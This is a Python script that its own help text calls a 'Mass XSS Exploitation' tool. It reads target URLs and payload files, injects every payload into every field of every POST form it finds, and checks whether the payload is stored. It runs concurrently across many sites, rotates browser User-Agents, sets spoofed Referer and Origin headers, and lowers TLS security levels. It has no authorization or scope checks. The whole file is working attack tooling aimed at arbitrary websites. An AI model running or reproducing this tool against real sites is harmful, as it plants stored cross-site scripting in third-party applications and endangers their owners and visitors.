import aiohttp
import asyncio
import json
from argparse import ArgumentParser
from colorama import Fore, Style
from typing import List, Dict, Optional
import random
from bs4 import BeautifulSoup
import urllib.parse
import ssl
import sys
import socket

# Default settings
DEFAULT_CONCURRENCY = 5
DEFAULT_TIMEOUT = 30
DEFAULT_CHECK_DELAY = 5
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

def log(message: str, level: str = "i") -> None:
    levels = {
        "i": f"{Fore.BLUE}[*]{Style.RESET_ALL}",
        "s": f"{Fore.GREEN}[+]{Style.RESET_ALL}",
        "w": f"{Fore.YELLOW}[!]{Style.RESET_ALL}",
        "e": f"{Fore.RED}[-]{Style.RESET_ALL}",
    }
    print(f"{levels.get(level, levels['i'])} {message}")

async def fetch_url(session: aiohttp.ClientSession, url: str, timeout: int) -> Optional[str]:
    try:
        ssl_context = ssl.create_default_context()
        ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
        
        async with session.get(
            url,
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=ssl_context,
            headers={'User-Agent': random.choice(USER_AGENTS)}
        ) as response:
            if response.status == 200:
                return await response.text()
            log(f"HTTP {response.status} for {url}", "w")
            return None
    except asyncio.TimeoutError:
        log(f"Timeout for {url}", "w")
        return None
    except aiohttp.ClientConnectorDNSError:
        log(f"Domain not found: {url}", "e")
        return None

async def submit_payload(
    session: aiohttp.ClientSession,
    url: str,
    form_data: Dict[str, str],
    param: str,
    payload: str,
    timeout: int
) -> bool:
    try:
        data = form_data.copy()
        data[param] = payload
        
        ssl_context = ssl.create_default_context()
        ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
        
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Referer': url,
            'Origin': urllib.parse.urlparse(url).scheme + '://' + urllib.parse.urlparse(url).netloc
        }
        
        async with session.post(
            url,
            data=data,
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=ssl_context,
            headers=headers
        ) as response:
            if response.status != 200:
                log(f"HTTP Error {response.status} when submitting to {param} at {url}", "e")
                return False
            return True
            
    except asyncio.TimeoutError:
        log(f"Timeout while submitting to {param} at {url}", "w")
        return False
    except aiohttp.ClientOSError as e:
        log(f"Error for {param} at {url}: {str(e)} (Errno: {e.errno})", "e")
        if e.errno == socket.errno.ECONNRESET:
            log(f"Connection reset by peer at {url}", "w")
        elif e.errno == socket.errno.ENETUNREACH:
            log("Network unreachable (check your internet connection)", "w")
        return False
    except aiohttp.ClientError as e:
        log(f"Client Error for {param} at {url}: {type(e).__name__}: {str(e)}", "e")
        return False
    except Exception as e:
        log(f"Unexpected Error for {param} at {url}: {type(e).__name__}: {str(e)}", "e")
        return False

async def check_stored_xss(
    session: aiohttp.ClientSession,
    url: str,
    payload: str,
    timeout: int
) -> bool:
    try:
        async with session.get(
            url,
            timeout=aiohttp.ClientTimeout(total=timeout)
        ) as response:
            content = await response.text()
            return payload in content
    except Exception:
        return False

async def process_target(
    session: aiohttp.ClientSession,
    target_url: str,
    payloads: List[str],
    timeout: int,
    check_delay: int,
    output_file: Optional[str]
) -> bool:
    if not target_url.startswith(('http://', 'https://')):
        target_url = f"http://{target_url}"
    
    try:
        try:
            html = await fetch_url(session, target_url, timeout)
            if not html:
                return False
        except Exception as e:
            log(f"Critical error for {target_url}: {type(e).__name__}: {str(e)}", "e")
            return False

        try:
            soup = BeautifulSoup(html, 'html.parser')
            forms = soup.find_all('form', method=lambda x: x and x.lower() == 'post')
            
            if not forms:
                log(f"No POST forms found at {target_url}", "i")
                return False
        except Exception as e:
            log(f"HTML parsing error for {target_url}: {type(e).__name__}: {str(e)}", "e")
            return False

        results = []
        
        for form in forms:
            try:
                form_url = form.get('action', target_url)
                if not form_url.startswith(('http://', 'https://')):
                    form_url = urllib.parse.urljoin(target_url, form_url)
                
                form_data = {}
                for inp in form.find_all(['input', 'textarea', 'select']):
                    if inp.get('name'):
                        form_data[inp.get('name')] = inp.get('value', '')
                
                if not form_data:
                    log(f"No form inputs found in form at {form_url}", "i")
                    continue
                
                for param in form_data:
                    for payload in payloads:
                        log(f"Testing {param} with payload: {payload[:50]}...", "i")
                        
                        submitted = await submit_payload(
                            session, form_url, form_data, param, payload, timeout
                        )
                        if not submitted:
                            continue
                        
                        await asyncio.sleep(check_delay)
                        stored = await check_stored_xss(
                            session, target_url, payload, timeout
                        )
                        
                        if stored:
                            result = {
                                "url": target_url,
                                "form_url": form_url,
                                "parameter": param,
                                "payload": payload,
                                "timestamp": str(asyncio.get_event_loop().time())
                            }
                            
                            if output_file:
                                with open(output_file, 'a', encoding='utf-8') as f:
                                    f.write(json.dumps(result) + '\n')
                            
                            log(f"Stored XSS found in {param}!", "s")
                            results.append(True)
            except Exception as e:
                log(f"Form processing error: {type(e).__name__}: {str(e)}", "e")
                continue
        
        return any(results)
    
    except Exception as e:
        log(f"Target processing error: {type(e).__name__}: {str(e)}", "e")
        return False

async def run_exploits(
    targets: List[str],
    payloads: List[str],
    concurrency: int,
    timeout: int,
    check_delay: int,
    output_file: Optional[str]
) -> Dict[str, int]:
    connector = aiohttp.TCPConnector(
        limit=concurrency,
        force_close=True,
        ssl=False
    )
    
    stats = {
        'total': 0,
        'success': 0,
        'failed': 0,
        'timeouts': 0
    }
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for url in targets:
            task = asyncio.create_task(
                process_target(
                    session, url, payloads, timeout, check_delay, output_file
                )
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        
        for result in results:
            stats['total'] += 1
            if result:
                stats['success'] += 1
            else:
                stats['failed'] += 1
    
    return stats

def load_targets(file_path: str) -> List[str]:
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        log(f"Error loading targets: {str(e)}", "e")
        sys.exit(1)

def load_payloads(file_path: str) -> List[str]:
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except Exception as e:
        log(f"Error loading payloads: {str(e)}", "e")
        sys.exit(1)

def main():
    parser = ArgumentParser(description="Mass XSS Exploitation")
    parser.add_argument("-t", "--target", required=True, help="File containing target URLs or domains")
    parser.add_argument("-p", "--payloads", required=True, help="File containing XSS payloads")
    parser.add_argument("-o", "--output", help="Output file for results (JSON format)")
    parser.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, 
                      help=f"Number of concurrent requests (default: {DEFAULT_CONCURRENCY})")
    parser.add_argument("-T", "--timeout", type=int, default=DEFAULT_TIMEOUT,
                      help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("-d", "--delay", type=int, default=DEFAULT_CHECK_DELAY,
                      help=f"Delay before checking stored payload (default: {DEFAULT_CHECK_DELAY})")
    
    args = parser.parse_args()

    try:
        targets = load_targets(args.target)
        payloads = load_payloads(args.payloads)

        log(f"Starting exploitation on {len(targets)} targets", "i")
        log(f"Timeout set to {args.timeout} seconds", "i")
        log(f"Check delay set to {args.delay} seconds", "i")
        
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write("")

        stats = asyncio.run(run_exploits(
            targets=targets,
            payloads=payloads,
            concurrency=args.concurrency,
            timeout=args.timeout,
            check_delay=args.delay,
            output_file=args.output
        ))

        print()
        log("Results:", "i")
        log(f"Total targets processed: {stats['total']}", "i")
        log(f"Successful exploitations: {stats['success']}", "s")
        log(f"Failed targets: {stats['failed']}", "w" if stats['failed'] else "i")

    except KeyboardInterrupt:
        print()
        log("Exploitation interrupted by user", "w")
    except Exception as e:
        log(f"Critical error: {str(e)}", "e")
        sys.exit(1)

if __name__ == "__main__":
    main()
